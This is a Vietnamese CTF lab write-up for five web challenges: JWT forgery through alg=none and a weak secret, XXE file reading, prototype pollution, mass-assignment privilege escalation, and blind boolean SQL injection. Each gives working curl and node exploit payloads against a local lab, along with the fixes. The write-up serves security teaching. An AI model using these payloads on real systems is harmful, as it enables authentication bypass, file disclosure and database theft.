## CTF #6 · JWT yếu — 25đ

**Mục tiêu:** `FLAG{jwt-...}` chỉ hiện trong `/api/profile` khi token có `sub=ctfsvc` — user này không tồn tại trong DB, phải **forge** token.

**Root cause kép:**
1. Secret ký HS256 là `secret123` — trong từ điển, crack offline được.
2. `/api/profile` chấp nhận `alg=none` — header xin "đừng kiểm chữ ký" và server nghe theo → forge không cần khoá.

**Exploit — cách 1 (alg=none, không cần công cụ):**

```bash
# tự dựng token: base64url(header).base64url(payload). (chữ ký rỗng)
node -e "b=o=>Buffer.from(JSON.stringify(o)).toString('base64url');console.log(b({alg:'none',typ:'JWT'})+'.'+b({sub:'ctfsvc',role:'svc'})+'.')"
# → eyJhbGciOiJub25l...  (dán vào:)
curl "http://127.0.0.1:3000/api/profile?token=<TOKEN>"
# → {"sub":"ctfsvc","flag":"FLAG{jwt-...}"}
```

**Cách 2 (crack + ký lại — học về secret yếu):**

```bash
curl -X POST http://127.0.0.1:3000/api/token -d "username=alice&password=alice123"   # lấy token thật
node src/cli.js jwt decode <TOKEN>     # xem payload
node src/cli.js jwt crack <TOKEN>      # → secret123 (từ điển nhỏ tích hợp)
node src/cli.js jwt forge --payload='{"sub":"ctfsvc","role":"svc"}' --secret=secret123
curl "http://127.0.0.1:3000/api/profile?token=<FORGED>"   # → cờ y hệt
```

**Hardened:** verify từ chối `alg=none`, chỉ nhận HS256, secret ngẫu nhiên per-session → cả hai đường trên đều 401.

**Bài học:** 2 lớp thất bại độc lập — thuật toán (chấp nhận none) VÀ khoá (yếu). JWT an toàn = danh sách trắng alg + khoá đủ entropy + kiểm `exp`/`aud`.

## CTF #7 · XXE — 20đ

**Mục tiêu:** `FLAG{xxe-...}` trong `file:///flag-xxe.txt` trên filesystem ảo của lab.

**Root cause:** `POST /api/import` phân tích XML và resolve `<!ENTITY x SYSTEM "file:///...">` — entity external đọc file nội bộ rồi in vào response.

**Exploit:**

```bash
curl -X POST http://127.0.0.1:3000/api/import \
  -H 'content-type: application/xml' \
  --data '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag-xxe.txt">]><i><item>&x;</item></i>'
# → {"items":["... FLAG{xxe-...} ..."]}
```

Lab **mô phỏng** trên VFS (không đụng đĩa thật — vẫn an toàn tuyệt đối). Thử `file:///etc/passwd` và `file:///secrets.txt` — lab có bản giả lập cả hai.

**Hardened:** từ chối mọi body chứa `DOCTYPE`/`ENTITY` → 400 `dtd_prohibited`. Đây đúng chuẩn vá thật: cờ `FEATURE_SECURE_PROCESSING`/`disallow-doctype` trong mọi XML parser.

**Bài học:** XXE = parser nhận "chỉ thị đọc file" của kẻ tấn công. Vá ở *config parser*, không vá bằng regex lọc `file://` (evade: `FILE://`, entity lồng, parameter entity).

## CTF #8 · Prototype Pollution — 30đ

**Mục tiêu:** `FLAG{proto-...}` hiện trong `GET /api/config` khi `Object.prototype` bị nhiễm.

**Root cause:** `unsafeMerge()` (`src/lab/app.js`) merge đệ quy không lọc key:

```js
function unsafeMerge(dst, src) {
  for (const k in src)
    if (typeof src[k] === 'object') unsafeMerge(dst[k], src[k]);
    else dst[k] = src[k];
}
// k="__proto__" → dst.__proto__ = Object.prototype → ghi xuyên vào gốc!
```

`dst["__proto__"]` không tạo key mới — nó *là* Object.prototype. Thuộc tính ghi vào đó trở thành enumerable trên mọi object.

**Exploit:**

```bash
curl -X POST http://127.0.0.1:3000/api/config \
  -H 'content-type: application/json' \
  --data '{"__proto__":{"isAdmin":true}}'
curl http://127.0.0.1:3000/api/config
# → "protoPolluted":["isAdmin"], "flag":"FLAG{proto-...}"
```

`protoPolluted` = `Object.keys(Object.prototype)` — nhờ JS spec: key ghi vào prototype trở thành **enumerable**, nên liệt kê được. Lab biến side-effect vô hình thành điều nhìn thấy được.

**Hardened:** `safeMerge()` bỏ qua `__proto__`, `constructor`, `prototype` → `protoPolluted` luôn `[]`, không cờ.

**Bài học:** lỗ hổng của *runtime semantics*, không phải của input validation đơn thuần — blacklist key nguy hiểm khi merge, hoặc `Object.create(null)`/`Map`. Thế giới thật: lodash.merge CVE-2018-16487, jQuery CVE-2019-11358.

## CTF #9 · Mass Assignment — 25đ

**Mục tiêu:** `FLAG{mass-...}` trong `GET /api/me` khi user **tự đăng ký** có `role=admin`.

**Root cause:** `POST /api/register` gộp *cả query string* vào field rồi copy toàn bộ vào user object — thiếu whitelist field được phép.

**Exploit:**

```bash
curl -X POST "http://127.0.0.1:3000/api/register?role=admin" \
  -d "username=attacker&password=pw12345"
# → 201 {"user":{"role":"admin"}}

# lấy session rồi xem /api/me:
curl -si -X POST http://127.0.0.1:3000/login -d "username=attacker&password=pw12345" \
  | grep -i set-cookie        # session=xxx
curl -H "Cookie: session=xxx" http://127.0.0.1:3000/api/me
# → {"role":"admin","flag":"FLAG{mass-...}"}
```

Chi tiết đáng chú ý: `?role=admin` nằm trong QUERY STRING chứ không phải form — "input từ nhiều nguồn không phân biệt" là biến thể nguy hiểm của mass assignment (Rails/GitHub 2012 cùng gốc rễ). Cờ chỉ xuất hiện cho user tự đăng ký (id≥100) — alice admin thật (id=1) không tính, buộc bạn thực sự leo quyền.

**Hardened:** whitelist cứng `{username,password}` → `?role=admin` bị phớt lờ, user tạo với `role:'user'`, `/api/me` sạch.

**Bài học:** tin tưởng *shape* của input cũng nguy hiểm như tin nội dung — entity phải được build qua whitelist, không phải `Object.assign(input)`.

## CTF #10 · Blind SQLi — 40đ (khó nhất)

**Mục tiêu:** `FLAG{blind-...}` trong bảng ẩn `ctf_blind` — response không bao giờ lộ trực tiếp.

**Root cause:** `/track?code=` ghép input vào `WHERE code='${code}'` — SQLi điển hình, NHƯNG response chỉ có 2 trạng thái: `200 "TỒN TẠI"` hoặc `404 "không tìm thấy"`. Không lộ dữ liệu, không lộ lỗi → oracle boolean.

**Bước 1 — xác nhận oracle:**

```bash
curl -o /dev/null -w '%{http_code}\n' "http://127.0.0.1:3000/track?code=AB-100'%20AND%201=1%20--"   # 200
curl -o /dev/null -w '%{http_code}\n' "http://127.0.0.1:3000/track?code=AB-100'%20AND%201=2%20--"   # 404
```

⚠ Cạm bẫy kinh điển: `'1'='1 --` sẽ cho `'1' = '1 --'` — literal không bằng nhau vì nháy cuối dính vào chuỗi → luôn 404, tưởng oracle chết. Dùng `AND 1=1` (không nháy).

**Bước 2 — rút cờ từng ký tự:**

```
AB-100' AND (SELECT substr(flag,N,1) FROM ctf_blind)='X' --
```

200 = ký tự thứ N là 'X'; 404 = thử ký tự khác. Lặp N=1..đến khi hết (mọi ký tự đều 404 = hết cờ). ~24 ký tự × trung bình ~10 lần thử = ~240 request — script ~15 dòng.

**Bước 3 — tối ưu (tuỳ chọn):** biết trước cờ dạng `FLAG{blind-[0-9a-f]{12}}` → chỉ thử charset hex ở phần sau, bỏ qua prefix. Hoặc binary search `substr(...)> 'g'` → ~5 hỏi/ký tự.

**Hardened:** `trackShipmentSafe()` parameterized — `AND 1=1` trở thành chuỗi literal không khớp mã nào → 404, oracle chết hoàn toàn.

**Bài học:** "không lộ dữ liệu trong response" ≠ an toàn — side-channel ở status code là đủ để rút CSDL. Detection: endpoint `/track` nhận ≥N request cùng IP chứa cú pháp SQL = behavioral alert (rule `blind-sqli` của `detect`).
